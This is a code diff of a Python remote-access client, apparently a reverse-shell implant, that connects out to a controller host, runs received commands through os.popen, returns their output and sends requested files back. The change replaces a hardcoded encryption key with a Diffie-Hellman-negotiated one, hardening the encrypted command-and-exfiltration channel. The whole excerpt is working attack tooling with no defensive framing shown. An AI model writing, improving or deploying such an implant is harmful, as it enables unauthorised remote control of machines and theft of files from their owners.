@@ -12,10 +12,11 @@ FALLBACK_KEY  = '82e672ae054aa4de6f042c888111686a'
 def main():
     s = socket.socket()
     s.connect((HOST, PORT))
-
+    DHKEY = diffiehellman(s)
+    #print binascii.hexlify(DHKEY) #debug: confirm DHKEY matches
     while True:
         data = s.recv(1024)
-        data = decrypt(data, FALLBACK_KEY).split()
+        data = decrypt(data, DHKEY).split()
 
         # seperate data into command and action
         cmd, action = data[0], ' '.join(data[1:])
@@ -32,7 +33,7 @@ def main():
         # run command
         elif cmd == 'run':
             results = os.popen(action).read()
-            s.sendall(encrypt(results, FALLBACK_KEY))
+            s.sendall(encrypt(results, DHKEY))
 
         # send file
         elif cmd == 'download':
@@ -41,7 +42,7 @@ def main():
             f = open(f_name, 'rb')
             results = f.read(1024)
             while True:
-                s.send(encrypt(results, FALLBACK_KEY))
+                s.send(encrypt(results, DHKEY))
                 results = f.read(1024)
                 if results == '':
                     break
